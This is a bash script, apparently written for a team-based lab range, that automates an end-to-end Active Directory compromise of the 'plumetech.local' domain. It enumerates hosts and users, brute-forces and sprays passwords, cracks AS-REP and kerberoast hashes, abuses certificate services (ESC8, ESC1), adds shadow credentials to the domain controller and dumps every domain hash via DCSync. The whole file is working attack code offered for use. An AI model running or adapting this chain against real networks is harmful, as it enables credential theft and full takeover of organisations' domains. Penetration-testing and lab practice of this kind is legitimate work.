#!/bin/bash

COLOR_RED="\e[1;91m"
COLOR_GREEN="\e[1;92m"
COLOR_YELLOW="\e[1;93m"
COLOR_RESET="\e[0m"

print_error() {
    echo -e "\n\t${COLOR_RED}[-] $1${COLOR_RESET}\n"
}

print_success() {
    echo -e "\n\t${COLOR_GREEN}[+] $1${COLOR_RESET}\n"
}

print_info() {
    echo -e "\n\t${COLOR_YELLOW}[*] $1${COLOR_RESET}\n"
}

ENTERPRISE_DOMAIN="plumetech.local"
OT_DOMAIN="plumetech-ot.local"
PASSWORDLIST_SPRAY="2023-200_most_used_passwords.txt"
PASSWORDLIST_ROCKYOU="rockyou.txt"

####### check team id

if [ $# -ne 1 ]; then
    print_error "Usage: $0 <TEAM_ID>"
    exit 1
fi

TEAM_ID=$1

####### check privs

if [ $EUID -ne 0 ]; then
    print_error "Script must be run with 'sudo ${0##*/}' or as root!"
    exit 1
fi

####### locate machines

LOG_FILE="nxc.tmp"

print_info "Locating the windows machines with netexec ..."
nxc smb 10.0.$TEAM_ID.0/24 --log $LOG_FILE

ENTERPRISE_CLIENT=$(cat $LOG_FILE | grep -m 1 "name:CLI1" | awk '{print $9}')
ENTERPRISE_FILE_SERVER=$(cat $LOG_FILE | grep -m 1 "name:FS1" | awk '{print $9}')
ENTERPRISE_DOMAIN_CONTROLLER=$(cat $LOG_FILE | grep -m 1 "name:DC1" | awk '{print $9}')
DMZ_JUMP=$(cat $LOG_FILE | grep -m 1 "name:JUMP" | awk '{print $9}')
DMZ_DOMAIN_CONTROLLER=$(cat $LOG_FILE | grep -m 1 "name:OTDC1" | awk '{print $9}')

rm $LOG_FILE

print_success "Enterprise Client: $ENTERPRISE_CLIENT"
print_success "Enterprise File Server: $ENTERPRISE_FILE_SERVER"
print_success "Enterprise Domain Controller: $ENTERPRISE_DOMAIN_CONTROLLER"
print_success "DMZ Jump: $DMZ_JUMP"
print_success "DMZ Domain Controller: $DMZ_DOMAIN_CONTROLLER"

####### discover emails on website

EMAILS_FILE="emails.txt"

print_info "Searching for emails on the website ..."
curl -s http://$ENTERPRISE_FILE_SERVER | grep -Eoi '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | sort -u > $EMAILS_FILE
cat $EMAILS_FILE

####### validate usernames against dc

USERS_FILE="users.txt"

print_info "Validating usernames with kerbrute ..."
kerbrute userenum -d $ENTERPRISE_DOMAIN --dc $ENTERPRISE_DOMAIN_CONTROLLER $EMAILS_FILE -o $USERS_FILE.tmp
grep "VALID USERNAME" $USERS_FILE.tmp | awk '{print $7}' | cut -d'@' -f1 > $USERS_FILE
rm $USERS_FILE.tmp

####### brute force login credentials

CREDENTIALS_BRUTE_FILE="credentials_brute.txt"

print_info 'Brute forcing login credentials with kerbrute ...'

for email in $(cat $EMAILS_FILE);
    do kerbrute bruteuser --dc $ENTERPRISE_DOMAIN_CONTROLLER -d $ENTERPRISE_DOMAIN $PASSWORDLIST_SPRAY $email -o $CREDENTIALS_BRUTE_FILE.tmp
    cat $CREDENTIALS_BRUTE_FILE.tmp | grep "VALID LOGIN" | awk '{print $7}' >> $CREDENTIALS_BRUTE_FILE
    rm $CREDENTIALS_BRUTE_FILE.tmp
done

credential_brute=$(cat "$CREDENTIALS_BRUTE_FILE" | head -n 1)
username_brute=$(echo "$credential_brute" | cut -d'@' -f1) # impacket scripts require 'username' instead of 'username@domain'
password_brute=$(echo "$credential_brute" | cut -d':' -f2)
print_success "Found Credential: $username_brute:$password_brute"

rm $CREDENTIALS_BRUTE_FILE

####### as-rep roasting

CREDENTIALS_AS_REP_FILE="credentials_as_rep.txt"

print_info 'Running as-rep roasting attack ...'

impacket-GetNPUsers -dc-ip $ENTERPRISE_DOMAIN_CONTROLLER -usersfile $USERS_FILE $ENTERPRISE_DOMAIN/ -outputfile hashes.tmp
hashcat hashes.tmp $PASSWORDLIST_ROCKYOU
hashcat hashes.tmp $PASSWORDLIST_ROCKYOU --show > $CREDENTIALS_AS_REP_FILE

credential_as_rep=$(cat "$CREDENTIALS_AS_REP_FILE" | tail -n 1)
username_as_rep=$(echo "$credential_as_rep" | awk -F'$' '{print $4}' | cut -d'@' -f1)
password_as_rep=$(echo "$credential_as_rep" | awk -F':' '{print $3}')
print_success "Found Credential: $username_as_rep:$password_as_rep"

rm hashes.tmp
rm $CREDENTIALS_AS_REP_FILE

####### esc8

print_info 'Running ESC8 attack ...'

certipy-ad relay -target "http://$ENTERPRISE_DOMAIN_CONTROLLER" -template User -debug
certipy-ad auth -pfx *.pfx -dc-ip $ENTERPRISE_DOMAIN_CONTROLLER > hashes.tmp
credential_esc8=$(cat hashes.tmp | tail -n 1)
username_esc8=$(echo "$credential_esc8" | awk -F "'" '{print $2}' | cut -d'@' -f1)
hashes_esc8=$(echo "$credential_esc8" | awk '{print $6}')
print_success "Found Credential: $username_esc8:$hashes_esc8"

rm *.pfx
rm *.ccache
rm hashes.tmp

####### run bloodhound

print_info 'Starting bloodhound ...'

bloodhound-python -u $username_brute -p $password_brute -ns $ENTERPRISE_DOMAIN_CONTROLLER -c all -d $ENTERPRISE_DOMAIN
cat *_users.json | jq '[.data[].Properties.samaccountname]'[] -r | grep -v null > $USERS_FILE

rm *_computers.json
rm *_containers.json
rm *_domains.json
rm *_gpos.json
rm *_groups.json
rm *_ous.json
rm *_users.json

####### another as-rep roasting attack against all domain users

print_info 'Running as-rep roasting attack against all domain users ...'

impacket-GetNPUsers -dc-ip $ENTERPRISE_DOMAIN_CONTROLLER -usersfile $USERS_FILE $ENTERPRISE_DOMAIN/ 

####### kerberoasting

CREDENTIALS_KERBEROASTING_FILE="credentials_kerberoasting.txt"

print_info 'Running kerberoasting attack ...'

impacket-GetUserSPNs -dc-ip $ENTERPRISE_DOMAIN_CONTROLLER -request -outputfile "hashes.tmp" $ENTERPRISE_DOMAIN/$username_brute:$password_brute
hashcat hashes.tmp $PASSWORDLIST_ROCKYOU
hashcat hashes.tmp $PASSWORDLIST_ROCKYOU --show > $CREDENTIALS_KERBEROASTING_FILE

credential_kerberoasting=$(cat "$CREDENTIALS_KERBEROASTING_FILE" | tail -n 1)
username_kerberoasting=$(echo "$credential_kerberoasting" | awk -F'$' '{print $4}' | cut -d'*' -f2)
password_kerberoasting=$(echo "$credential_kerberoasting" | awk -F':' '{print $2}')
print_success "Found Credential: $username_kerberoasting:$password_kerberoasting"

rm hashes.tmp
rm $CREDENTIALS_KERBEROASTING_FILE

####### spray password from kerberoasting attack

CREDENTIALS_SPRAY_FILE="credentials_spray.txt"

print_info 'Spraying password from kerberoasting attack ...'

kerbrute passwordspray --dc $ENTERPRISE_DOMAIN_CONTROLLER -d $ENTERPRISE_DOMAIN $USERS_FILE $password_kerberoasting -o $CREDENTIALS_SPRAY_FILE.tmp
cat $CREDENTIALS_SPRAY_FILE.tmp | grep "VALID LOGIN" | awk '{print $7}' >> $CREDENTIALS_SPRAY_FILE
rm $CREDENTIALS_SPRAY_FILE.tmp

credential_passwordspray=$(cat $CREDENTIALS_SPRAY_FILE | grep -v "$username_kerberoasting")
username_passwordspray=$(echo "$credential_passwordspray" | cut -d'@' -f1) # impacket scripts require 'username' instead of 'username@domain'
password_passwordspray=$(echo "$credential_passwordspray" | cut -d':' -f2)
print_success "Found Credential: $username_passwordspray:$password_passwordspray"

rm $CREDENTIALS_SPRAY_FILE

####### shadow credentials attack

print_info 'Running the shadow credentials attack with the user from as-rep roasting ...'

pywhisker -d $ENTERPRISE_DOMAIN --dc-ip $ENTERPRISE_DOMAIN_CONTROLLER -u $username_as_rep -p "$password_as_rep" --pfx-password "password" --filename cert --target "DC1$" --action "add"
source PKINITtools/venv/bin/activate
python3 PKINITtools/gettgtpkinit.py -dc-ip $ENTERPRISE_DOMAIN_CONTROLLER -cert-pfx cert.pfx -pfx-pass "password" "$ENTERPRISE_DOMAIN/DC1$" ticket.ccache > gettgtpkinit.tmp 2>&1 # gettgtpkinit.py prints to stderr, its weird
aeskey_pywhisker=$(cat gettgtpkinit.tmp | sed -n '8 p' | cut -f3 -d ':')
rm gettgtpkinit.tmp
KRB5CCNAME=ticket.ccache python3 PKINITtools/getnthash.py -dc-ip $ENTERPRISE_DOMAIN_CONTROLLER -key $aeskey_pywhisker "$ENTERPRISE_DOMAIN/DC1$" > getnthash.tmp
shadow_hash=$(cat getnthash.tmp | tail -n 1)
rm getnthash.tmp
deactivate

print_success "Found Credential: DC1$:$shadow_hash"

rm ticket.ccache
rm cert.pfx
rm *.pem

####### dcsync attack

print_info 'Running dcsync attack using the shadow credentials ...'

SECRETSDUMP_FILE="secretsdump.txt"

impacket-secretsdump 'DC1$@'$ENTERPRISE_DOMAIN_CONTROLLER -hashes ":$shadow_hash" -outputfile $SECRETSDUMP_FILE

# backup_hash=$(cat $SECRETSDUMP_FILE.ntds) | 

####### ESC1

print_info 'Running ESC1 attack ... (should fail)'

certipy-ad find -vulnerable -stdout -dc-ip $ENTERPRISE_DOMAIN_CONTROLLER -u $username_brute@$ENTERPRISE_DOMAIN -p $password_brute
certipy-ad req -dc-ip $ENTERPRISE_DOMAIN_CONTROLLER -u $username_brute@$ENTERPRISE_DOMAIN -p $password_brute -ca PLUMETECH-DC1-CA -template smartcard -upn administrator@$ENTERPRISE_DOMAIN
certipy-ad auth -dc-ip $ENTERPRISE_DOMAIN_CONTROLLER -pfx administrator.pfx

rm administrator.pfx

####### check for rdp access to jump

LOG_FILE="nxc.tmp"

print_info 'Checking for RDP access to JUMP ...'

nxc smb $ENTERPRISE_DOMAIN_CONTROLLER -u $username_brute -p $password_brute --users --log $LOG_FILE
cat $LOG_FILE | grep -i "RDP access" | awk '{print $12}' > $USERS_FILE # contains 2 invalid users (first and last line) but will work for now




####### cleanup

rm $EMAILS_FILE
rm $USERS_FILE
